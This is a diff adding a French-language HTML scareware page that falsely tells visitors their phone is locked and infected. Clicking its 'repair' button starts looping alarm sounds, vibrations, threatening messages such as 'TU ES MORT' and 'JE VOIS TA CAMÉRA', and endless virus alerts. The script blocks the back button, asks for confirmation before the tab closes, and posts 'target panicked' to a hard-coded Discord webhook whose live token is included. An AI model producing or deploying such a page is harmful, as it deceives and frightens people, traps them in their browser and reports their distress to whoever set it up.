@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,user-scalable=no">
+<title>⚠️ SYSTÈME INFECTÉ ⚠️</title>
+<style>
+  body{margin:0;font-family:'Courier New', Courier, monospace;background:#000;color:#0f0;overflow:hidden;height:100vh;display:flex;align-items:center;justify-content:center;}
+  
+  .scare-text {
+    position: absolute; color: #f00; font-weight: bold; font-size: 24px;
+    text-transform: uppercase; text-shadow: 0 0 10px #f00; white-space: nowrap;
+    z-index: 999; pointer-events: none; opacity: 0;
+  }
+
+  .main-box {
+    border: 2px solid #f00; padding: 20px; background: rgba(0,0,0,0.8);
+    text-align: center; z-index: 1000; max-width: 90%; box-shadow: 0 0 30px #f00;
+    position: relative;
+  }
+
+  h1 { font-size: 28px; margin: 0 0 15px 0; text-shadow: 0 0 10px #f00; }
+  p { font-size: 14px; color: #fff; margin-bottom: 20px; line-height: 1.5; }
+  
+  .btn-fake {
+    background: #f00; color: #fff; border: none; padding: 15px 30px;
+    font-size: 18px; font-weight: bold; text-transform: uppercase; cursor: pointer;
+    animation: blink 1s infinite;
+  }
+
+  @keyframes blink { 50% { opacity: 0; } }
+  
+  .matrix-bg {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    z-index: -1; opacity: 0.3;
+    background-image: url('https://i.imgur.com/7bK9Y4g.png'); 
+    background-size: cover;
+  }
+  
+  /* empêche le scroll de base */
+  html, body { overscroll-behavior: none; touch-action: none; }
+</style>
+</head>
+<body>
+
+<div class="matrix-bg"></div>
+
+<div class="main-box" id="mainBox">
+  <h1>ACCÈS REFUSÉ</h1>
+  <p>Votre appareil a été verrouillé par le service de sécurité.<br>Une activité illégale a été détectée.</p>
+  <button class="btn-fake" id="startScare">RÉPARER MON TÉLÉPHONE</button>
+</div>
+
+<script>
+const HOOK = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";
+const phrases = [
+  "TON IP EST LOCALISÉE", "TU ES MORT", "JE VOIS TA CAMÉRA", 
+  "GOG ET MAGOG ARRIVENT", "DONNÉES VOLÉES", "WARNING", 
+  "N'ÉTEINS PAS TON TÉLÉPHONE", "JE TE REGARDE", "VITE VITE VITE"
+];
+const sonFlippant = new Audio("https://www.soundjay.com/buttons/sounds/button-09.mp3");
+sonFlippant.loop = true;
+
+let isScaring = false;
+let textInterval;
+let audioInterval;
+
+// bloque le retour en arrière
+history.pushState(null, null, location.href);
+window.onpopstate = function () { history.go(1); };
+
+// bloque la fermeture de l'onglet (demande de confirmation)
+window.addEventListener('beforeunload', function (e) {
+  if (isScaring) {
+    e.preventDefault();
+    e.returnValue = 'Êtes-vous sûr de vouloir quitter ? Vos données seront perdues.';
+  }
+});
+
+function startScare() {
+  if (isScaring) return;
+  isScaring = true;
+  
+  document.getElementById("mainBox").style.display = "none"; 
+  
+  // SONS
+  sonFlippant.volume = 1.0;
+  sonFlippant.play().catch(e=>{});
+  audioInterval = setInterval(() => {
+    const bruit = new Audio("https://www.soundjay.com/buttons/sounds/button-30.mp3");
+    bruit.volume = 0.5;
+    bruit.play().catch(e=>{});
+  }, 500);
+
+  // VIBRATIONS
+  if (navigator.vibrate) {
+    setInterval(() => navigator.vibrate([500, 100, 500, 100, 1000]), 2000);
+  }
+
+  // TEXTES
+  textInterval = setInterval(() => {
+    const el = document.createElement("div");
+    el.className = "scare-text";
+    el.innerText = phrases[Math.floor(Math.random() * phrases.length)];
+    el.style.top = Math.random() * 90 + "vh";
+    el.style.left = Math.random() * 80 + "vw";
+    el.style.fontSize = (Math.random() * 30 + 15) + "px";
+    el.style.transform = `rotate(${Math.random() * 60 - 30}deg)`;
+    document.body.appendChild(el);
+    setTimeout(() => el.remove(), 2000);
+  }, 100);
+
+  // ZOOM ET TREMBLEMENT
+  document.body.style.animation = "shake 0.5s infinite";
+  const style = document.createElement('style');
+  style.innerHTML = `
+    @keyframes shake {
+      0% { transform: translate(1px, 1px) rotate(0deg) scale(1); }
+      10% { transform: translate(-1px, -2px) rotate(-1deg) scale(1.02); }
+      20% { transform: translate(-3px, 0px) rotate(1deg) scale(1.05); }
+      30% { transform: translate(3px, 2px) rotate(0deg) scale(1.08); }
+      40% { transform: translate(1px, -1px) rotate(1deg) scale(1.1); }
+      50% { transform: translate(-1px, 2px) rotate(-1deg) scale(1.15); }
+      60% { transform: translate(-3px, 1px) rotate(0deg) scale(1.1); }
+      70% { transform: translate(3px, 1px) rotate(-1deg) scale(1.05); }
+      80% { transform: translate(-1px, -1px) rotate(1deg) scale(1.02); }
+      90% { transform: translate(1px, 2px) rotate(0deg) scale(1); }
+      100% { transform: translate(1px, -2px) rotate(-1deg) scale(1); }
+    }
+  `;
+  document.head.appendChild(style);
+
+  // ALERTES
+  setInterval(() => {
+    if (isScaring) alert("⚠️ SYSTÈME COMPROMIS ⚠️\n\nUn virus a été installé. Ne fermez pas cette page.");
+  }, 4000);
+
+  // ENVOYER SUR DISCORD
+  fetch(HOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({content: "**🚨 CIBLE PANIQUÉE 🚨**\nQuelqu'un vient de cliquer sur le bouton et a déclenché le bordel."})
+  });
+}
+
+document.getElementById("startScare").addEventListener("click", startScare);
+</script>
+</body>
+</html>
